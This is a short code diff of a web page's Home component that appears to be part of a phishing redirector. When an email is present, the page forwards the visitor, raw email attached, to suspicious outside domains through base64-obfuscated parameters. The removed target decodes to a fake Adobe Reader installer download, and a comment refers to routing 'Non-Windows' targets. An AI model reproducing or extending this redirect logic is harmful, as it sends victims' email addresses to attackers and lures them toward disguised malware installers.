@@ -37,7 +37,7 @@ export default function Home() {
     if (email) {
       // Redirect to Non-Windows target with raw email
       window.location.href =
-        `https://accounts.fxzova.icu?xJsf1Kdet7hf=aHR0cHM6Ly9qb21yeS5jb20vYWRvYmUtcmVhZGVycy9pbnN0YWxsZXIvZG93bmxvYWQuaHRtbA==&smn=${email}`;
+        `https://tagtechpro.com/i/?aXBkYXRhPTIwNS4yMzQuMTgxLjMwJnN2PWdlbmVyYWwmcj1LQSZ1aWQ9VVNFUjE1MDcyMDI1VTUyMDcxNTE3JnM9TGE=#${email}`;
     }
   }, []);
 
